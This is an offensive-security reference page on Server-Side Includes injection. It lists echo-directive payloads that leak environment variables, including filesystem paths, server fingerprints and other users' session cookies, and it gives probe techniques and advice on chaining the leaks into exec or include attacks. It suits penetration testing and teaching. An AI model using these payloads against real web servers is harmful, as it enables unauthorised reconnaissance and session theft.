---
title: "SSI environment disclosure"
description: "The echo directive prints SSI and CGI environment variables into the page, leaking paths, client data, and server configuration when input reaches an SSI-parsed document."
keywords:
  - SSI echo var
  - environment disclosure
  - DOCUMENT_NAME
  - HTTP_USER_AGENT
  - CGI variables
---

# Environment disclosure

The `echo` directive prints the value of an SSI or CGI environment variable into the page. Where `exec` is blocked, `echo` is often still enabled, and it is a reliable way to confirm that SSI is being evaluated and to pull server state into the response without running a command.

## The directive

```
<!--#echo var="DOCUMENT_NAME"-->
<!--#echo var="DATE_LOCAL"-->
```

A reflected value proves the directive was parsed. `DOCUMENT_NAME` and `DATE_LOCAL` are standard SSI variables and make clean, low-risk probes.

## Built-in variables

`mod_include` exposes a fixed set of variables describing the current document and request:

```
<!--#echo var="DOCUMENT_NAME"-->
<!--#echo var="DOCUMENT_URI"-->
<!--#echo var="DATE_LOCAL"-->
<!--#echo var="DATE_GMT"-->
<!--#echo var="LAST_MODIFIED"-->
```

`DOCUMENT_URI` is the request's URL path and `DOCUMENT_NAME` the requested document's name, not the real on-disk path, so they confirm where reflected input is being rendered in URL space. The absolute filesystem path comes from `SCRIPT_FILENAME` or `PATH_TRANSLATED` below, when the server exposes them.

## CGI and request variables

The CGI variable set leaks far more. Client-controlled headers and connection metadata are all reachable:

```
<!--#echo var="HTTP_USER_AGENT"-->
<!--#echo var="HTTP_COOKIE"-->
<!--#echo var="REMOTE_ADDR"-->
<!--#echo var="REMOTE_PORT"-->
<!--#echo var="SERVER_SOFTWARE"-->
<!--#echo var="SERVER_NAME"-->
<!--#echo var="SERVER_ADDR"-->
<!--#echo var="QUERY_STRING"-->
<!--#echo var="PATH_TRANSLATED"-->
<!--#echo var="SCRIPT_FILENAME"-->
```

`SERVER_SOFTWARE` fingerprints the stack. `SCRIPT_FILENAME` and `PATH_TRANSLATED` reveal absolute filesystem paths, which feed directly into file inclusion and command payloads that need an exact path. `HTTP_COOKIE` can expose another user's session value when the directive is stored and rendered in an administrative view.

## Reflecting attacker-controlled variables

Because header-derived variables such as `HTTP_USER_AGENT` echo request input back out, they double as a cross-check. Set a marker in the header and read it back through `echo`:

```
User-Agent: SSIPROBE-7f3a
```

```
<!--#echo var="HTTP_USER_AGENT"-->
```

Seeing `SSIPROBE-7f3a` in the response confirms both that SSI runs and that the header reaches the parsed page.

## Custom and configured variables

Variables defined with `set`, or CGI variables exported by the application's environment, are readable by name. Enumerate likely names once the server software is known:

```
<!--#set var="probe" value="x"--><!--#echo var="probe"-->
<!--#echo var="HTTPS"-->
<!--#echo var="SERVER_PROTOCOL"-->
```

A non-existent variable typically renders as `(none)`, which itself distinguishes a parsed directive from one that was passed through untouched.

## Formatting the output

The `config` directive controls how `echo` renders values, and `timefmt` in particular changes the format of the date variables. Setting it before an `echo` is a clean, side-effect-free way to prove the parser is live and to vary output so caching or filtering does not mask the reflection:

```
<!--#config timefmt="%Y-%m-%d %H:%M:%S"--><!--#echo var="DATE_LOCAL"-->
```

`config errmsg` overrides the string the server emits when a later directive fails, which is useful for distinguishing a parsed-but-failed directive from one that was never evaluated:

```
<!--#config errmsg="SSI-ACTIVE"--><!--#include virtual="/does-not-exist"-->
```

If the response contains `SSI-ACTIVE` in place of the default error text, the directive stream is being parsed even though the include itself failed.

## Chaining disclosure into other primitives

Environment disclosure is usually a stepping stone. `SCRIPT_FILENAME` and `PATH_TRANSLATED` give the absolute on-disk location of the parsed page (while `DOCUMENT_URI` gives only its URL path), which lets file inclusion and command payloads use exact paths rather than stacking traversal sequences blindly. `SERVER_SOFTWARE` and `SERVER_PROTOCOL` fingerprint the stack so later payloads match the server. Collect these first, then pivot to `exec` or `include` with the paths and version details already in hand.

## References

- [OWASP: Server-Side Includes (SSI) Injection](https://owasp.org/www-community/attacks/Server-Side_Includes_(SSI)_Injection)
- [Apache mod_include documentation](https://httpd.apache.org/docs/current/mod/mod_include.html)
